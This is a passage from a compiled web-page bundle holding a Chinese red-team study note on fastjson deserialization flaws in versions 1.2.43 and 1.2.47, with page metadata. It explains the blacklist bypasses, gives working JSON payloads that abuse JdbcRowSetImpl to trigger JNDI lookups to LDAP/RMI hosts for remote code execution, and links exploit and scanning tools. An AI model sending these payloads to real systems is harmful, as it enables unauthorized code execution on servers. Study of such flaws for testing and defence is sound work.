</code></pre><h3 id="fastjson-1-2-43" tabindex="-1"><a class="header-anchor" href="#fastjson-1-2-43"><span>fastjson=1.2.43</span></a></h3><p>针对双写绕过套了个子判断。</p><pre><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span>3750763034362895579L <span class="token operator">^</span> <span class="token punctuation">(</span>long<span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">^</span> <span class="token punctuation">(</span>long<span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">==</span> 655701488918567152L<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span>3750763034362895579L <span class="token operator">^</span> <span class="token punctuation">(</span>long<span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">^</span> <span class="token punctuation">(</span>long<span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">==</span> 655656408941810501L<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">&quot;autoType is not support. &quot;</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                className <span class="token operator">=</span> className<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
</code></pre><p>TypeUtils.loadClass 中除了对<code>L;</code>进行判断，还有对<code>[</code>进行了判断</p><pre><code class="language-javascript"><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">&#39;[&#39;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">&gt;</span> componentType <span class="token operator">=</span> <span class="token function">loadClass</span><span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> classLoader<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> Array<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>componentType<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><figure><img src="`+v+`" alt="image-20230619180428246" tabindex="0" loading="lazy"><figcaption>image-20230619180428246</figcaption></figure><p><strong>Bypass</strong></p><p><strong>前提：需要开启 autotype</strong></p><p>构造如下 payload，具体为啥这么构造没有细跟，反正跟<code>[</code>有关</p><pre><code class="language-json"><span class="token punctuation">{</span><span class="token property">&quot;@type&quot;</span><span class="token operator">:</span><span class="token string">&quot;[com.sun.rowset.JdbcRowSetImpl”[{,&quot;</span>dataSourceName<span class="token string">&quot;:&quot;</span>ldap<span class="token operator">:</span><span class="token comment">//localhost:9999/a&quot;,&quot;autoCommit&quot;:true}&quot;</span>
</code></pre><p>首先是<code>[com.sun.rowset.JdbcRowSetImpl</code>，通过这个方式可以过 checkAutotype 检测。</p><p>其次是<code>[{,&quot;dataSourceName</code>，这里的<code>[{</code>主要目的是通过 fastjson 的自动检测，实际上就是对 token 进行控制，这里如果是<code>[</code>的话就会让 token 变为 14 从而通过之后的检测。</p><p>https://blog.csdn.net/qq_36869808/article/details/123201615</p><h3 id="fastjson-1-2-47" tabindex="-1"><a class="header-anchor" href="#fastjson-1-2-47"><span>fastjson&lt;=1.2.47</span></a></h3><p>44 版本针对 43 版本的绕过作了处理，[ 开头或者 L 开头 ; 结尾都会抛出异常</p><p><strong>Bypass</strong></p><p><strong>前提：1.2.25-1.2.32 版本：未开启 AutoTypeSupport 时能成功利用，开启 AutoTypeSupport 反而不能成功触发；1.2.33-1.2.47 版本：无论是否开启 AutoTypeSupport，都能成功利用；</strong></p><p>攻击 json 如下：</p><pre><code class="language-json"><span class="token punctuation">{</span>
  <span class="token property">&quot;a&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;java.lang.Class&quot;</span><span class="token punctuation">,</span> <span class="token comment">//放入内存</span>
    <span class="token property">&quot;val&quot;</span><span class="token operator">:</span> <span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token property">&quot;b&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
    <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="token punctuation">,</span> <span class="token comment">//触发payload弹计算器</span>
    <span class="token property">&quot;dataSourceName&quot;</span><span class="token operator">:</span> <span class="token string">&quot;rmi://ip/exp&quot;</span><span class="token punctuation">,</span>
    <span class="token property">&quot;autoCommit&quot;</span><span class="token operator">:</span> <span class="token boolean">true</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><p>在 DefaultJSONParser 类中。传进来的@type 的值要进入一个 checkAutoType()方法的判断：</p><figure><img src="`+x+'" alt="image-20230609105231200" tabindex="0" loading="lazy"><figcaption>image-20230609105231200</figcaption></figure><p>能够看出来这个方法中，会先做一个黑白名单的判断，</p><figure><img src="'+w+'" alt="image-20230609105736726" tabindex="0" loading="lazy"><figcaption>image-20230609105736726</figcaption></figure><p>在调用解析时我们没有传入预期的反序列化对象的对应类名时，会从 mapping 中或者 deserializers.findClass()寻找，当找到类之后会直接 return class，不会再进行 autotype 和黑名单校验，而在 deserializers 中有<code>java.lang.Class</code></p><p>先在 mapping 里找 java.lang.class，找不到</p><figure><img src="'+D+'" alt="image-20230609142233848" tabindex="0" loading="lazy"><figcaption>image-20230609142233848</figcaption></figure><p>去 deserializers 找，能找到</p><figure><img src="'+I+'" alt="image-20230609142504773" tabindex="0" loading="lazy"><figcaption>image-20230609142504773</figcaption></figure><p>进入 checkAutoType，校验通过</p><figure><img src="'+O+'" alt="image-20230609142713545" tabindex="0" loading="lazy"><figcaption>image-20230609142713545</figcaption></figure><figure><img src="'+C+'" alt="image-20230609142013160" tabindex="0" loading="lazy"><figcaption>image-20230609142013160</figcaption></figure><p>在校验 autotype 和黑名单之前就已经 return 了 clazz，变相绕过了黑名单，利用 JNDI 注入实现 RCE。</p><h3 id="各版本攻击方式汇总" tabindex="-1"><a class="header-anchor" href="#各版本攻击方式汇总"><span>各版本攻击方式汇总</span></a></h3><p>https://github.com/safe6Sec/Fastjson</p><h2 id="_4-工具使用" tabindex="-1"><a class="header-anchor" href="#_4-工具使用"><span>4. 工具使用</span></a></h2><h3 id="jndi-注入工具" tabindex="-1"><a class="header-anchor" href="#jndi-注入工具"><span>JNDI 注入工具</span></a></h3><p>下载地址：https://github.com/welk1n/JNDI-Injection-Exploit/tree/master，</p><p>https://github.com/wyzxxz/jndi_tool</p><p>类似的工具很多，github 搜索 JNDI 即可。</p><p>起 rmi 或 ldap 服务，命令如下：</p><figure><img src="'+z+'" alt="image-20230529100551944" tabindex="0" loading="lazy"><figcaption>image-20230529100551944</figcaption></figure><p><strong>ldap:</strong></p><figure><img src="'+L+'" alt="image-20230529100957138" tabindex="0" loading="lazy"><figcaption>image-20230529100957138</figcaption></figure><h3 id="fastjson-攻击工具" tabindex="-1"><a class="header-anchor" href="#fastjson-攻击工具"><span>fastjson 攻击工具</span></a></h3><p>https://github.com/a1phaboy/FastjsonScan</p><p>https://github.com/mrknow001/fastjson_rec_exploit 完全基于 dnslog，适合能访问外网的靶机</p><p>防御</p><p>https://github.com/YoungBear/FastjsonPoc</p>',148)])])}const P=s(R,[["render",A]]),E=JSON.parse('{"path":"/CyberSecurity/RedTeam/2-WebVulnerability/fastjson/FastjsonVul.html","title":"fastjson 漏洞分析及复现","lang":"zh-CN","frontmatter":{"category":"网络安全","tag":"漏洞分析","description":"fastjson 漏洞分析及复现 FastJson 是一个由阿里巴巴研发的 java 库，可以将 Java 对象转换为 JSON 格式，也可以将 JSON 字符串转换为 Java 对象。 fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。 fastjson 源码地址：https://github.com/alibaba...","head":[["meta",{"property":"og:url","content":"https://echo0d.github.io/DailyNotes/CyberSecurity/RedTeam/2-WebVulnerability/fastjson/FastjsonVul.html"}],["meta",{"property":"og:site_name","content":"echo0d-notes"}],["meta",{"property":"og:title","content":"fastjson 漏洞分析及复现"}],["meta",{"property":"og:description","content":"fastjson 漏洞分析及复现 FastJson 是一个由阿里巴巴研发的 java 库，可以将 Java 对象转换为 JSON 格式，也可以将 JSON 字符串转换为 Java 对象。 fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。 fastjson 源码地址：https://github.com/alibaba..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-06-04T09:27:16.000Z"}],["meta",{"property":"article:author","content":"echo0d"}],["meta",{"property":"article:tag","content":"漏洞分析"}],["meta",{"property":"article:modified_time","content":"2025-06-04T09:27:16.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"fastjson 漏洞分析及复现\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2025-06-04T09:27:16.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"echo0d\\",\\"url\\":\\"\\"}]}"]]},"headers":[{"level":2,"title":"1. fastjson 反序列化方式简介","slug":"_1-fastjson-反序列化方式简介","link":"#_1-fastjson-反序列化方式简介","children":[]},{"level":2,"title":"2. 反序列化漏洞基础","slug":"_2-反序列化漏洞基础","link":"#_2-反序列化漏洞基础","children":[{"level":3,"title":"（1）漏洞利用前提","slug":"_1-漏洞利用前提","link":"#_1-漏洞利用前提","children":[]},{"level":3,"title":"（2）反序列化实现 RCE","slug":"_2-反序列化实现-rce","link":"#_2-反序列化实现-rce","children":[]},{"level":3,"title":"（3）JNDI 注入","slug":"_3-jndi-注入","link":"#_3-jndi-注入","children":[]}]},{"level":2,"title":"3. 漏洞分析","slug":"_3-漏洞分析","link":"#_3-漏洞分析","children":[{"level":3,"title":"指纹判断","slug":"指纹判断","link":"#指纹判断","children":[]},{"level":3,"title":"fastjson<=1.2.24","slug":"fastjson-1-2-24","link":"#fastjson-1-2-24","children":[]},{"level":3,"title":"1.2.25<=fastjson<=1.2.41","slug":"_1-2-25-fastjson-1-2-41","link":"#_1-2-25-fastjson-1-2-41","children":[]},{"level":3,"title":"fastjson=1.2.42","slug":"fastjson-1-2-42","link":"#fastjson-1-2-42","children":[]},{"level":3,"title":"fastjson=1.2.43","slug":"fastjson-1-2-43","link":"#fastjson-1-2-43","children":[]},{"level":3,"title":"fastjson<=1.2.47","slug":"fastjson-1-2-47","link":"#fastjson-1-2-47","children":[]},{"level":3,"title":"各版本攻击方式汇总","slug":"各版本攻击方式汇总","link":"#各版本攻击方式汇总","children":[]}]},{"level":2,"title":"4. 工具使用","slug":"_4-工具使用","link":"#_4-工具使用","children":[{"level":3,"title":"JNDI 注入工具","slug":"jndi-注入工具","link":"#jndi-注入工具","children":[]},{"level":3,"title":"fastjson 攻击工具","slug":"fastjson-攻击工具","link":"#fastjson-攻击工具","children":[]}]}],"git":{"createdTime":1731665131000,"updatedTime":1749029236000,"contributors":[{"name":"echo0d","email":"echo0d@163.com","commits":3}]},"readingTime":{"minutes":10.97,"words":3290},"filePathRelative":"CyberSecurity/RedTeam/2-WebVulnerability/fastjson/FastjsonVul.md","localizedDate":"2024年11月15日","excerpt":"\\n","autoDesc":true}');export{P as comp,E as data};
